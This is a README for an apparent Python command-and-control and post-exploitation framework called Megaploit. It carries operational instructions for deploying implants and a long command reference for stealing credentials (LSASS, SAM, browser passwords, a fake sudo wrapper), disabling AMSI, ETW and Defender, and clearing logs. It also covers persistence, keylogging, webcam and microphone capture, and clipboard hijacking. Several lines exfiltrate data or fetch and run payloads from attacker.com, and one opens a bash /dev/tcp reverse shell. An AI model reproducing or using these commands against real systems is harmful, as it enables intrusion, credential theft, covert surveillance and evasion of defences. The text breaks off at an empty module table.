<div align="center">

# Megaploit

**Modern Python C2 Framework & Penetration Testing Toolbox**

*A Metasploit-class post-exploitation framework — Python-native, extensible, and built for modern infrastructure.*

[![CI](https://github.com/Josefifir/Megaploit/actions/workflows/ci.yml/badge.svg)](https://github.com/Josefifir/Megaploit/actions/workflows/ci.yml)
[![CodeQL](https://github.com/Josefifir/Megaploit/actions/workflows/codeql-analysis.yml/badge.svg)](https://github.com/Josefifir/Megaploit/actions/workflows/codeql-analysis.yml)
[![Docs](https://github.com/Josefifir/Megaploit/actions/workflows/docs.yml/badge.svg)](https://josefifir.github.io/Megaploit/)
[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue)](https://python.org)
[![License](https://img.shields.io/github/license/Josefifir/Megaploit)](LICENSE)
[![Tests](https://img.shields.io/badge/tests-553%20passing-brightgreen)](#running-tests)
[![Commands](https://img.shields.io/badge/session%20commands-135-blue)](#session-commands)
[![GitHub Stars](https://img.shields.io/github/stars/Josefifir/Megaploit?style=social)](https://github.com/Josefifir/Megaploit/stargazers)

**[📖 Full Docs](https://josefifir.github.io/Megaploit/) · [🐛 Report Bug](https://github.com/Josefifir/Megaploit/issues/new?template=bug_report.md) · [💡 Request Feature](https://github.com/Josefifir/Megaploit/issues/new?template=feature_request.md)**

</div>

---

> ⚠️ **For authorised security research and penetration testing only.**
> You must have explicit written permission before using this tool against any system.
> Misuse is illegal and unethical. The authors accept no liability.

---

## Table of Contents

- [What is Megaploit?](#what-is-megaploit)
- [Installation](#installation)
- [Step 1 — Start the Server](#step-1--start-the-server)
- [Step 2 — Generate an Agent](#step-2--generate-an-agent)
- [Step 3 — Deploy the Agent](#step-3--deploy-the-agent)
- [Step 4 — Interact with a Session](#step-4--interact-with-a-session)
- [Global Commands](#global-commands)
- [Session Commands — Complete Reference](#session-commands--complete-reference)
  - [Core / Navigation](#core--navigation)
  - [File System](#file-system)
  - [File Transfer](#file-transfer)
  - [Process & System Intelligence](#process--system-intelligence)
  - [Credential Harvesting](#credential-harvesting)
  - [Privilege Escalation](#privilege-escalation)
  - [Evasion & Anti-Forensics](#evasion--anti-forensics)
  - [Persistence](#persistence)
  - [Keylogger](#keylogger)
  - [Network & Pivoting](#network--pivoting)
  - [Screen & Media Capture](#screen--media-capture)
  - [GUI Interaction](#gui-interaction)
  - [Clipboard](#clipboard)
  - [Code Injection](#code-injection)
  - [Windows Registry](#windows-registry)
  - [Desktop & Window Station](#desktop--window-station)
  - [Background Jobs](#background-jobs)
  - [Advanced Shell — Meterpreter-class](#advanced-shell--meterpreter-class)
  - [Python REPL on Agent](#python-repl-on-agent)
  - [Runtime Extensions](#runtime-extensions)
  - [Post Modules (in-session)](#post-modules-in-session)
- [Exploit Modules](#exploit-modules)
- [Scanner Modules](#scanner-modules)
- [Payload Builder](#payload-builder)
- [Post-Exploitation Pipeline](#post-exploitation-pipeline)
- [Pivot Routes](#pivot-routes)
- [Toolbox](#toolbox)
- [Plugin System](#plugin-system)
- [Web Dashboard & RPC](#web-dashboard--rpc)
- [TLS Encryption](#tls-encryption)
- [AutoRunScript](#autorunscript)
- [Credential Store & Reporting](#credential-store--reporting)
- [Architecture](#architecture)
- [Running Tests](#running-tests)
- [Professional Pentester Reference](#professional-pentester-reference)
  - [Engagement Workflow](#engagement-workflow)
  - [OPSEC Checklist](#opsec-checklist)
  - [Payload Delivery Matrix](#payload-delivery-matrix)
  - [Privilege Escalation Decision Tree](#privilege-escalation-decision-tree)
  - [Credential Harvesting Priority Order](#credential-harvesting-priority-order)
  - [Pivoting Techniques Compared](#pivoting-techniques-compared)
  - [Evasion Stack](#evasion-stack)
  - [Full Internal Network Engagement Example](#full-internal-network-engagement-example)
  - [External Assessment Example](#external-assessment-example)
  - [Active Directory Attack Chain](#active-directory-attack-chain)
  - [Automation & Scripting](#automation--scripting)
  - [Extending Megaploit](#extending-megaploit)

---

## What is Megaploit?

Megaploit is a **Command & Control (C2) framework** and **penetration testing toolbox** written entirely in Python 3.10+. Think of it as a Python-native Metasploit — with an interactive operator console, reverse-shell agents, exploit modules, scanners, a payload builder, and 135 post-exploitation commands.

**Key things it can do:**
- Receive reverse-shell connections from target machines (agents)
- Give you full control over those machines through 135 specialised commands
- Run exploit modules against targets (EternalBlue, Log4Shell, BlueKeep, and 17 more)
- Build payloads in 14 formats (Python, PowerShell, EXE, ELF, Go binary, and more)
- Pivot through compromised hosts into internal networks
- Harvest credentials, screenshots, keystrokes, files
- Remain stealthy with AES-256-GCM encrypted transport, AMSI bypass, ETW patching

---

## Installation

### Requirements

| Requirement | Notes |
|---|---|
| Python 3.10+ | 3.11+ recommended |
| `git` on PATH | For toolbox clone operations |
| Linux / macOS / Windows | All three supported |

### Automated (Linux / macOS)

```bash
git clone https://github.com/Josefifir/Megaploit.git
cd Megaploit
sudo bash install.sh
```

### Manual

```bash
git clone https://github.com/Josefifir/Megaploit.git
cd Megaploit
pip install -r requirements.txt
```

**Optional packages** (unlock additional features):

```bash
pip install cryptography    # AES-256-GCM transport — strongly recommended
pip install flask           # Web dashboard
pip install impacket        # SMB enumeration + SMB exploit modules
pip install paramiko        # SSH brute-force module
pip install pyinstaller     # Build EXE/ELF payloads
pip install pyyaml          # Malleable C2 profiles
```

### Docker

```bash
# Build image
docker build -t megaploit .

# Run — replace 192.168.1.10 with your actual IP
docker run -it --rm \
  -p 4444:4444 -p 8080:8080 \
  -v megaploit-data:/data \
  -e LHOST=192.168.1.10 \
  megaploit
```

---

## Step 1 — Start the Server

First, generate a shared secret key (both operator and agent use this):

```bash
python3 -c "import os,binascii; open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))"
```

Then start the server, passing your **real, routable IP address** as `LHOST`:

```bash
# Plain (no TLS)
python3 server.py -lh 192.168.1.10 -p 4444

# With auto-generated TLS certificate (recommended)
python3 server.py -lh 192.168.1.10 -p 4444 --tls

# Bind on all interfaces, agents call back to 10.0.0.1
python3 server.py --rhost 0.0.0.0 -lh 10.0.0.1 -p 4444

# Restrict connections to one source IP
python3 server.py -lh 10.0.0.1 -p 4444 --allow-ip 10.0.0.5
```

When the server starts you see:

```
  ┌─ Server Configuration ─────────────────────────────────┐
  │  LHOST        192.168.1.10                              │
  │  Port         4444                                      │
  │  TLS          disabled                                  │
  │  IP allowlist any  ⚠                                    │
  └─────────────────────────────────────────────────────────┘

[+] Listener ready on 0.0.0.0:4444
[*] Agents should call back to  192.168.1.10:4444

  Type help for commands.

  v4  megaploit [0] »
```

The `[0]` badge shows how many active sessions you have.

---

## Step 2 — Generate an Agent

Inside the console, set your callback IP and port, then generate:

```
megaploit [0] » set lhost 192.168.1.10
[+] lhost  →  192.168.1.10

megaploit [0] » set port 4444
[+] port  →  4444

megaploit [0] » generate
[+] agent.py patched with LHOST=192.168.1.10 PORT=4444
```

To generate a compiled Windows EXE:

```
megaploit [0] » payload exe --out agent.exe
```

To generate a PowerShell one-liner you can paste into a terminal:

```
megaploit [0] » payload oneliner_ps1
```

To generate a stealth Python agent with obfuscation:

```
megaploit [0] » payload py --encoder comment_spam --encoder varname_rand --out obf_agent.py
```

See [Payload Builder](#payload-builder) for all 14 formats.

---

## Step 3 — Deploy the Agent

Copy the agent to the target machine and execute it. The agent will connect back to your server.

**Python agent:**

```bash
# Copy these three items to the target:
#   agent.py
#   secret.key
#   megaploit/  (the whole directory)

# On the target:
python3 agent.py
```

**Windows EXE (no Python required on target):**

```
# Just copy agent.exe and secret.key to the target, then:
agent.exe
```

Once the agent connects, your console shows:

```
  ┌─────────────────────────────────────┐
  │  ★  NEW SESSION  #1  ★             │
  │  Address   10.0.0.42:49321          │
  │  Interact  use 1                    │
  └─────────────────────────────────────┘
```

---

## Step 4 — Interact with a Session

Type `use 1` (replace `1` with the session ID shown):

```
megaploit [1] » use 1

  ╔══════════════════════════════════════════════════╗
  ║  Megaploit Advanced Shell  (Meterpreter-class)   ║
  ╚══════════════════════════════════════════════════╝
  Session  : 1   10.0.0.42:49321
  [*] Gathering target info…
      OS: Windows 10 21H2  Hostname: WORKSTATION-7  User: jdoe

megaploit (10.0.0.42) > sysinfo
megaploit (10.0.0.42) > whoami
megaploit (10.0.0.42) > ps
megaploit (10.0.0.42) > ls C:\Users\jdoe\Desktop
megaploit (10.0.0.42) > download C:\Users\jdoe\Documents\passwords.xlsx
megaploit (10.0.0.42) > background
```

Type `help` inside a session to see all 135 commands with their descriptions.
Type `back` or press Ctrl-Z to return to the global prompt without killing the session.

---

## Global Commands

These are typed at the `megaploit [N] »` prompt (before entering a session).

### Session Management

| Command | Example | Description |
|---|---|---|
| `sessions` | `sessions` | List all active sessions with ID, IP, OS, tag, uptime |
| `sessions -K` | `sessions -K` | Kill **all** active sessions |
| `sessions -k <id>` | `sessions -k 2` | Kill one session by ID |
| `sessions -u <id>` | `sessions -u 1` | Upgrade session (load meterp extensions) |
| `sessions -c <cmd>` | `sessions -c whoami` | Run a C2 command on **all** sessions |
| `sessions -s <tag>` | `sessions -s dc` | Filter session list by tag |
| `use <id>` | `use 1` | Enter the interactive session console |
| `broadcast <cmd>` | `broadcast id` | Run a raw shell command on ALL sessions |

### Server Configuration

| Command | Example | Description |
|---|---|---|
| `set lhost <ip>` | `set lhost 10.0.0.1` | Set the agent callback IP |
| `set port <port>` | `set port 4444` | Set the agent callback port |
| `set cert <file>` | `set cert cert.pem` | Set TLS certificate file |
| `set key <file>` | `set key key.pem` | Set TLS key file |
| `set auto_update on` | `set auto_update on` | Enable automatic tool updates |

### TLS

```
megaploit [0] » tls auto           # Generate a self-signed cert and enable TLS now
megaploit [0] » tls status         # Show cert path and SHA-256 fingerprint
megaploit [0] » tls regen          # Force-regenerate (rotate cert)
```

### Module System

```
megaploit [0] » show modules                          # Browse all modules
megaploit [0] » show modules exploit                  # Filter by type
megaploit [0] » use exploits/linux/http/log4shell_cve2021_44228
megaploit [0] » setopt RHOSTS 10.0.0.50
megaploit [0] » setopt LHOST 192.168.1.10
megaploit [0] » options                               # Show current option values
megaploit [0] » check                                 # Test if target is vulnerable (safe)
megaploit [0] » run                                   # Execute the module
megaploit [0] » info                                  # Show module description + references
megaploit [0] » back                                  # Deselect module
```

### Other Global Commands

| Command | Description |
|---|---|
| `help` | Show all global commands |
| `clear` | Clear the terminal |
| `whats new` | Show the latest changelog |
| `history` | Show last 20 commands |
| `history search <query>` | Search command history |
| `alias <name> <cmd>` | Create a shortcut: `alias sys sysinfo` |
| `unalias <name>` | Remove an alias |
| `aliases` | List all aliases |
| `engagement name <n>` | Name the current engagement |
| `engagement show` | Show engagement info |
| `loot browse` | Browse all collected files |
| `report html report.html` | Generate HTML engagement report |
| `report json report.json` | Generate JSON report |
| `jobs list` | List background jobs |
| `jobs kill <id>` | Stop a background job |
| `creds show` | Show credential store |
| `creds search admin` | Search credentials |
| `creds export creds.json` | Export credentials |
| `web start` | Start web dashboard at http://127.0.0.1:8080 |
| `web stop` | Stop web dashboard |
| `rpc start` | Start multi-operator JSON-RPC server |
| `listener add <port>` | Start an additional listener on another port |
| `listener add <port> --tls` | Additional TLS listener |
| `listener add <port> --http` | HTTP-upgrade (WebSocket) listener |
| `listener list` | Show all active listeners |
| `route add 10.10.0.0/16 2` | Add pivot route through session 2 |
| `route print` | List all pivot routes |
| `route remove 10.10.0.0/16` | Remove a pivot route |
| `route flush` | Remove all pivot routes |
| `exit` | Shut down Megaploit |

---

## Session Commands — Complete Reference

Enter a session with `use <id>`. The prompt changes to `megaploit session(1) »` or `megaploit (10.0.0.42) >`.

### Core / Navigation

| Command | Example | Description |
|---|---|---|
| `help` | `help` | Show all 135 commands with descriptions |
| `sysinfo` | `sysinfo` | OS, hostname, username, Python version, CPU%, RAM, disk |
| `whoami` | `whoami` | Current user + administrator/root status |
| `getpid` | `getpid` | The agent's own process ID |
| `getuid` | `getuid` | UID / domain\\user details |
| `cd <dir>` | `cd C:\Users` | Change working directory on the target |
| `back` | `back` | Return to global prompt (session stays alive) |
| `background` | `background` | Detach session (alias of `back`) |
| `exit` | `exit` | Terminate the agent process and close session |
| `sleep <secs>` | `sleep 60` | Put agent to sleep (jitter, max 1 hour) |
| `beacon_sleep <secs>` | `beacon_sleep 30` | Change the agent reconnect interval |

### File System

| Command | Example | Description |
|---|---|---|
| `ls [path]` | `ls /home/user` | List directory with size/perms/date |
| `ls` | `ls` | List current directory |
| `cat <file>` | `cat /etc/passwd` | Print file contents |
| `tail <file> [n]` | `tail /var/log/auth.log 50` | Last N lines (default 20) |
| `find_files <path> <pattern>` | `find_files /home *.key` | Recursive file search by glob |
| `find_files /` | `find_files / *.pem` | Find all PEM certificates |
| `find_writable <path>` | `find_writable /var/www` | Find world-writable files and dirs |
| `find_suid` | `find_suid` | List SUID/SGID binaries (Linux privesc) |
| `file_hash <file>` | `file_hash /etc/shadow` | SHA-256 hash of a remote file |
| `search <path> <keyword>` | `search /home password` | Recursive grep for a keyword |
| `search / api_key` | `search /var/www api_key` | Find secrets in web app files |
| `write_file <path> <data>` | `write_file /tmp/test.sh "#!/bin/bash\nid"` | Write text to a file |
| `mkdir <path>` | `mkdir /tmp/.hidden` | Create a directory |
| `rm <path>` | `rm /tmp/agent.py` | Delete a file or directory |
| `chmod <mode> <file>` | `chmod 755 /tmp/exploit.sh` | Change permissions (Unix) |

### File Transfer

```
# Upload a file to the target:
megaploit (10.0.0.42) > upload /path/to/tool.py
  [████████████████████] 100.0%  14 KB / 14 KB   2 MB/s
[+] Uploaded 'tool.py'  (14 KB  in 0.1s  @ 2 MB/s)

# Download a file from the target:
megaploit (10.0.0.42) > download /etc/shadow
  [████████████████████] 100.0%  1 KB / 1 KB   512 KB/s
[+] Saved to: loot/session_1_10.0.0.42/shadow  (1 KB  in 0.0s)

# Download a whole directory as a zip:
megaploit (10.0.0.42) > zip_download /home/victim/.ssh
[+] Archive saved: loot/session_1_10.0.0.42/.ssh.zip

# Upload a local directory as a zip:
megaploit (10.0.0.42) > zip_upload /tmp/tools tools.zip

# Verify a file transfer (compare SHA-256 both sides):
megaploit (10.0.0.42) > verify /local/file.zip /remote/file.zip
[+] SHA-256 match — transfer integrity confirmed.
```

### Process & System Intelligence

| Command | Example | Description |
|---|---|---|
| `ps` | `ps` | Full process list (PID, name, user, CPU) |
| `ps <filter>` | `ps chrome` | Filter by process name |
| `kill <pid>` | `kill 1234` | Terminate a process by PID |
| `netstat` | `netstat` | Active TCP/UDP connections and listening ports |
| `arp` | `arp` | ARP cache — discover other LAN hosts |
| `routes` | `routes` | IP routing table |
| `ifconfig` | `ifconfig` | All network interfaces with IPs and MACs |
| `env` | `env` | All environment variables |
| `env <filter>` | `env PATH` | Filter env vars by key |
| `installed_software` | `installed_software` | Installed programs (registry/dpkg/rpm) |
| `active_windows` | `active_windows` | All visible window titles on the desktop |
| `scheduled_tasks` | `scheduled_tasks` | Scheduled tasks / cron jobs |
| `services` | `services` | Running and stopped services |
| `services <filter>` | `services sql` | Filter services by name |
| `users` | `users` | Local user accounts and groups |
| `logged_in` | `logged_in` | Currently logged-in users |
| `startup_items` | `startup_items` | Autostart entries (registry, startup folder) |
| `os_info` | `os_info` | Detailed OS: build number, patch level, install date |
| `dns_query <host>` | `dns_query internal-dc.corp` | DNS lookup from the target |
| `idle_time` | `idle_time` | Seconds since last keyboard/mouse input |

### Credential Harvesting

```bash
# Dump /etc/shadow (Linux) or SAM+SYSTEM hive (Windows) — needs root/SYSTEM
megaploit (10.0.0.42) > hashdump

# Extract all saved Wi-Fi passwords
megaploit (10.0.0.42) > wifi_passwords

# Steal browser passwords and cookies (Chrome, Edge, Brave, Firefox)
megaploit (10.0.0.42) > browser_creds
megaploit (10.0.0.42) > browser_creds passwords
megaploit (10.0.0.42) > browser_creds cookies

# Read browser history (last 100 entries)
megaploit (10.0.0.42) > browser_history
megaploit (10.0.0.42) > browser_history 200

# Dump Windows Credential Manager (saved RDP, VPN, generic creds)
megaploit (10.0.0.42) > cred_vault

# Harvest all SSH private keys, known_hosts, and shell history
megaploit (10.0.0.42) > ssh_harvest

# Plant a fake sudo wrapper that captures the next password typed (Linux)
megaploit (10.0.0.42) > sudo_sniff
# ... wait for victim to use sudo, then:
megaploit (10.0.0.42) > sudo_sniff_read
megaploit (10.0.0.42) > sudo_sniff_clean    # clean up the fake wrapper

# Check current token privileges
megaploit (10.0.0.42) > whoami_priv
```

#### Kiwi — Windows Credential Dumper

Kiwi is a compiled C binary that runs on Windows targets. It compiles automatically on first use (requires MinGW or MSVC).

```bash
# Run getsystem first to get SYSTEM privileges, then:
megaploit (10.0.0.42) > getsystem

# Dump NTLM hashes from LSASS memory (most powerful — needs SYSTEM)
megaploit (10.0.0.42) > kiwi logonpasswords

# Dump SAM hive offline (needs backup privilege or SYSTEM)
megaploit (10.0.0.42) > kiwi sam

# LSA secrets (domain cached credentials, service account passwords)
megaploit (10.0.0.42) > kiwi lsa

# Windows Credential Manager (current user — no elevation needed)
megaploit (10.0.0.42) > kiwi credman

# Kerberos tickets
megaploit (10.0.0.42) > kiwi tickets

# Enable WDigest cleartext caching (persists until reboot — then kiwi logonpasswords)
megaploit (10.0.0.42) > kiwi wdigest

# Run all Kiwi modules in sequence
megaploit (10.0.0.42) > kiwi all
```

### Privilege Escalation

```bash
# Attempt SYSTEM via 3 methods in cascade:
# 1. Named-pipe impersonation (schtasks SYSTEM lure + ImpersonateNamedPipeClient)
# 2. SeDebugPrivilege token steal
# 3. Unquoted service path discovery
megaploit (10.0.0.42) > getsystem

# Bypass UAC via fodhelper registry hijack (no prompts, Windows 10/11)
megaploit (10.0.0.42) > uac_bypass cmd.exe
megaploit (10.0.0.42) > uac_bypass "powershell -ep bypass -c whoami"

# Steal a token from a SYSTEM process and impersonate it
megaploit (10.0.0.42) > token_steal
megaploit (10.0.0.42) > token_steal 4        # steal from PID 4 (System)

# Create an impersonation token for a specific user
megaploit (10.0.0.42) > make_token DOMAIN\admin P@ssw0rd

# Revert to your original token after impersonation
megaploit (10.0.0.42) > rev2self

# Run a command as a different user
megaploit (10.0.0.42) > run_as Administrator P@ssw0rd whoami
megaploit (10.0.0.42) > run_as DOMAIN\service_user Password123 "net user /domain"

# Show current privileges and what can be abused
megaploit (10.0.0.42) > whoami_priv
```

### Evasion & Anti-Forensics

```bash
# Byte-patch AmsiScanBuffer → RET stub (disables AMSI for this process)
megaploit (10.0.0.42) > patch_amsi

# Disable Windows Defender via registry + service
megaploit (10.0.0.42) > disable_defender

# Live ETW patch — disables Event Tracing for Windows telemetry
megaploit (10.0.0.42) > etw_patch

# Check if we're in a sandbox/VM (CPU count, disk size, uptime, debugger, mouse)
megaploit (10.0.0.42) > sandbox_check

# Hide a file (set FILE_ATTRIBUTE_HIDDEN on Windows)
megaploit (10.0.0.42) > hide_file C:\Users\user\AppData\agent.py

# Timestomp — copy timestamps from a legitimate file
megaploit (10.0.0.42) > timestomp C:\evil.exe C:\Windows\System32\notepad.exe

# Clear Windows event logs (System, Security, Application) or Linux syslog/auth.log
megaploit (10.0.0.42) > clear_logs

# Lock the screen while you operate (cover tracks)
megaploit (10.0.0.42) > lock_screen

# Wipe agent + persistence + keylog, then kill agent process
megaploit (10.0.0.42) > self_destruct
```

### Persistence

```bash
# Add a Windows Run registry key so the agent restarts on login
megaploit (10.0.0.42) > persist WindowsUpdate agent.py
# This copies agent.py to %APPDATA% and adds a Run key named "WindowsUpdate"

# Enumerate all autostart entries (see what was installed and what else exists)
megaploit (10.0.0.42) > startup_items

# Enumerate scheduled tasks / cron
megaploit (10.0.0.42) > scheduled_tasks
```

### Keylogger

```bash
# Start silent keystroke capture in background
megaploit (10.0.0.42) > keylog_start
[+] Keylogger started.

# ... wait for victim to type (passwords, emails, etc.) ...

# Read everything captured so far
megaploit (10.0.0.42) > keylog_dump

# Stop and delete the keylog file on the target
megaploit (10.0.0.42) > keylog_stop
```

### Network & Pivoting

```bash
# Show all network connections and listening ports
megaploit (10.0.0.42) > netstat

# Show network interfaces and IPs
megaploit (10.0.0.42) > ifconfig

# Show ARP cache (who else is on the LAN)
megaploit (10.0.0.42) > arp

# ICMP ping sweep to find live hosts
megaploit (10.0.0.42) > ping_sweep 10.10.10.0/24

# Active ARP scan — finds hosts even when ICMP is blocked
megaploit (10.0.0.42) > arp_scan 10.10.10.0/24

# TCP port scan from the target's perspective (reaches internal hosts)
megaploit (10.0.0.42) > port_scan 10.10.10.5 22,80,443,3389,8080-8090
megaploit (10.0.0.42) > port_scan 10.10.10.5 1-1024

# Forward a port from the target to an internal machine
# Traffic to target:8888 is relayed to 10.10.10.20:3389
megaploit (10.0.0.42) > portfwd 8888 10.10.10.20 3389

# Start a SOCKS5 proxy on the target (routes all traffic through the target)
megaploit (10.0.0.42) > socks5
megaploit (10.0.0.42) > socks5 9050
# Then configure your tools to use SOCKS5 proxy at target-IP:1080

# SMB share enumeration
megaploit (10.0.0.42) > smb_shares 10.10.10.10

# Domain recon — list computers, DCs, and shares
megaploit (10.0.0.42) > net_view
megaploit (10.0.0.42) > net_view CORPORATE.LOCAL

# Enable Remote Desktop
megaploit (10.0.0.42) > rdp_enable

# DNS lookup from the target's resolver
megaploit (10.0.0.42) > dns_query internal-dc.corp
megaploit (10.0.0.42) > dns_query fileserver.local

# SSH to an internal host using discovered creds
megaploit (10.0.0.42) > ssh_connect 10.10.10.20 22 root P@ssword!

# Exfiltrate data over DNS (bypasses HTTP firewalls)
megaploit (10.0.0.42) > exfil_dns "sensitive_data_here" attacker.com

# Exfiltrate a file over HTTP
megaploit (10.0.0.42) > exfil_http http://attacker.com/upload secrets.zip
```

### Screen & Media Capture

```bash
# Take a single screenshot
megaploit (10.0.0.42) > screenshot
[+] Screenshot saved: loot/session_1_10.0.0.42/screenshots/20240115_143022.png

# Capture a specific screen region (x, y, width, height)
megaploit (10.0.0.42) > screenshot_region 0 0 1920 1080

# Take 10 screenshots every 30 seconds (saved as a zip)
megaploit (10.0.0.42) > screenshot_timelapse 10 30
[+] Timelapse saved: loot/session_1.../timelapse.zip  (10 frames, 30s apart)

# Record screen as MP4 video (30 seconds, 12 fps, 1280px wide)
megaploit (10.0.0.42) > screenrecord 30
megaploit (10.0.0.42) > screenrecord 60 24 1920

# Stream live JPEG frames over the C2 channel (save to loot)
megaploit (10.0.0.42) > stream 30 10       # 30 frames at 10 fps
[+] 30 frames saved to loot/session_1.../stream/

# Start live desktop MJPEG stream (view in browser at http://target:5000)
megaploit (10.0.0.42) > screen_stream on
megaploit (10.0.0.42) > screen_stream off

# Live webcam stream (view at http://target:5001)
megaploit (10.0.0.42) > webcam on
megaploit (10.0.0.42) > webcam off

# Record microphone (60 seconds, saves as WAV)
megaploit (10.0.0.42) > record 60
[+] Recording saved: loot/session_1.../recordings/20240115_143500.wav

# Check if someone is speaking right now
megaploit (10.0.0.42) > mic_level
[+] Microphone level: -32 dB (quiet)
```

### GUI Interaction

```bash
# Pop a dialog box on the target's desktop (social engineering / distraction)
megaploit (10.0.0.42) > msgbox "Windows Security" "Your session has expired. Please log in."

# Show a silent OS notification (system tray)
megaploit (10.0.0.42) > notify "Update Available" "Restart required to apply updates."

# Move mouse to coordinates and optionally click
megaploit (10.0.0.42) > mouse_move 960 540
megaploit (10.0.0.42) > mouse_move 960 540 click

# Type text silently as if the user typed it
megaploit (10.0.0.42) > type_keys text "hello from attacker"

# Fire a hotkey (open Run dialog: Win+R, then type a command)
megaploit (10.0.0.42) > type_keys hotkey win r
megaploit (10.0.0.42) > type_keys text "cmd.exe"

# Open a URL in the default browser
megaploit (10.0.0.42) > open_url https://your-phishing-page.com

# Play a sound file through target's speakers
megaploit (10.0.0.42) > play_sound C:\Windows\Media\tada.wav

# Change the desktop wallpaper
megaploit (10.0.0.42) > set_wallpaper C:\Users\user\Pictures\photo.jpg
```

### Clipboard

```bash
# Read whatever is currently in the clipboard (passwords, copied text, etc.)
megaploit (10.0.0.42) > getclip

# Overwrite the clipboard (clipboard hijacking)
megaploit (10.0.0.42) > setclip "http://malicious-site.com/fake-download.exe"

# Monitor clipboard changes for 120 seconds (catch passwords as they're copied)
megaploit (10.0.0.42) > clip_watch 120
```

### Code Injection

```bash
# Inject shellcode into a process (PID + hex-encoded shellcode)
megaploit (10.0.0.42) > inject_shellcode 1234 fc4883e4f0e8...

# Inject a DLL into a process
megaploit (10.0.0.42) > dll_inject 1234 C:\Windows\Temp\evil.dll

# Use signed Windows LOLBins to execute commands (bypasses application whitelisting)
megaploit (10.0.0.42) > living_off_land mshta http://attacker.com/payload.hta
megaploit (10.0.0.42) > living_off_land certutil -urlcache -f http://attacker.com/a.exe a.exe
megaploit (10.0.0.42) > living_off_land rundll32 C:\Temp\evil.dll,EntryPoint

# Execute a binary with explicit arguments (no shell, stdout+stderr captured)
megaploit (10.0.0.42) > execute C:\Windows\System32\net.exe user /domain

# Open a separate PTY reverse shell (independent of the C2 channel)
megaploit (10.0.0.42) > reverse_shell 192.168.1.10 5555
```

### Windows Registry

Full read/write/delete access to the Windows registry.

```bash
# List all values and subkeys under a registry key
megaploit (10.0.0.42) > reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion

# Read a single registry value
megaploit (10.0.0.42) > reg get HKCU\Software\Microsoft\Windows\CurrentVersion\Run MyApp
megaploit (10.0.0.42) > reg get HKLM\SYSTEM\CurrentControlSet\Control\Lsa LimitBlankPasswordUse

# Write / create a registry value (types: REG_SZ, REG_DWORD, REG_BINARY, REG_MULTI_SZ)
megaploit (10.0.0.42) > reg set HKCU\Software\Microsoft\Windows\CurrentVersion\Run Updater REG_SZ "C:\Users\user\AppData\agent.exe"
megaploit (10.0.0.42) > reg set HKLM\SYSTEM\CurrentControlSet\Control\Lsa UseLogonCredential REG_DWORD 1

# Delete a registry value
megaploit (10.0.0.42) > reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run Updater

# Delete an entire key
megaploit (10.0.0.42) > reg delete HKCU\Software\EvilApp
```

**HIVE shortcuts:** `HKLM`, `HKCU`, `HKCR`, `HKU`, `HKCC`

### Desktop & Window Station

```bash
# Get the name of the current interactive desktop
megaploit (10.0.0.42) > getdesktop
[+] Current desktop: Default (WinSta0\Default)

# List all desktops in the current window station
megaploit (10.0.0.42) > enumdesktops
[+] Desktops in WinSta0: Default, Winlogon, Screen-saver
```

### Background Jobs

Run long commands in the background without waiting for them to finish.

```bash
# Submit a command as a background job
megaploit (10.0.0.42) > run_bg find / -name "*.pem" 2>/dev/null
[+] Job started: job_abc123

# ... do other things while it runs ...

# Retrieve the output when done
megaploit (10.0.0.42) > job_result job_abc123
/etc/ssl/certs/ca-certificates.pem
/home/user/.ssh/id_rsa.pem
...

# Check job list from the global prompt
megaploit [1] » jobs list
```

---

## Advanced Shell — Meterpreter-class

When you type `use <id>`, you enter a fully interactive session console with tab-completion, per-session command history, and the following advanced capabilities.

### Drop into a Real PTY Shell

This gives you a full terminal with job control, colour, and arrow-key support:

```bash
megaploit (10.0.0.42) > interactive
  [*] PTY ready — Ctrl-C to detach
$ whoami
jdoe
$ sudo su -
# id
uid=0(root) gid=0(root) groups=0(root)
# apt install nmap -y
# exit
  [*] PTY session ended.
```

### PowerShell Execution (Windows)

```bash
# Run a PowerShell one-liner with execution policy bypass
megaploit (10.0.0.42) > run_psh "Get-LocalUser | Select Name,Enabled"
megaploit (10.0.0.42) > run_psh "Get-Process | Sort-Object CPU -Desc | Select -First 10"
megaploit (10.0.0.42) > run_psh "Get-ADUser -Filter * | Select Name,SamAccountName,Enabled"
megaploit (10.0.0.42) > run_psh "(New-Object Net.WebClient).DownloadString('http://10.0.0.1/script.ps1') | IEX"
```

### In-Agent Python Execution

Execute Python snippets directly inside the agent's interpreter — no file needed:

```bash
megaploit (10.0.0.42) > run_python import os; print(os.getcwd())
megaploit (10.0.0.42) > run_python import socket; print(socket.gethostbyname('internal-dc.corp'))
megaploit (10.0.0.42) > run_python import subprocess; print(subprocess.check_output(['id'], text=True))
megaploit (10.0.0.42) > run_python open('/tmp/backdoor','w').write('#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/5555 0>&1')
```

### Process Migration

Move the agent into another running process — useful for hiding inside a trusted process or surviving the death of the original process:

```bash
megaploit (10.0.0.42) > ps
  1234  explorer.exe
  4832  svchost.exe
  6100  notepad.exe

megaploit (10.0.0.42) > migrate 4832
[+] Migrated to PID 4832 via PyRun_SimpleString remote thread
```

### Memory Read/Write

```bash
# Read 128 bytes from process 1234 at address 0x7fff0000
megaploit (10.0.0.42) > memory_read 1234 0x7fff0000 128

# Write base64-encoded bytes into a process
megaploit (10.0.0.42) > memory_write 1234 0x7fff0000 SGVsbG8gV29ybGQ=
```

### Python REPL on Agent

```bash
megaploit (10.0.0.42) > irb
>>> import os
>>> os.listdir('/etc')
['passwd', 'shadow', 'hosts', ...]

>>> for user in open('/etc/passwd').readlines():
...     if 'bash' in user:
...         print(user.strip())

root:x:0:0:root:/root:/bin/bash
jdoe:x:1000:1000::/home/jdoe:/bin/bash

>>>                     # blank line to execute multi-line block
>>> exit
```

---

## Exploit Modules

All 20+ exploit modules are auto-discovered from `megaploit/modules/exploits/`.

```
megaploit [0] » show modules exploits
```

### Using an Exploit

```
# Step 1: Select the module
megaploit [0] » use exploits/linux/http/log4shell_cve2021_44228

# Step 2: Set required options
megaploit [0] » setopt RHOSTS 10.0.0.50
megaploit [0] » setopt RPORT 8080
megaploit [0] » setopt LHOST 192.168.1.10

# Step 3: Check the target (safe — no payload sent)
megaploit [0] » check
[+] 10.0.0.50:8080 — JNDI injection point confirmed (HTTP 200)

# Step 4: Run it
megaploit [0] » run
[+] Payload sent to 1/1 host(s)
[+] CONFIRMED callback from: 10.0.0.50
```

### Available Modules

| Path | CVE | Platform |
|---|---|---|
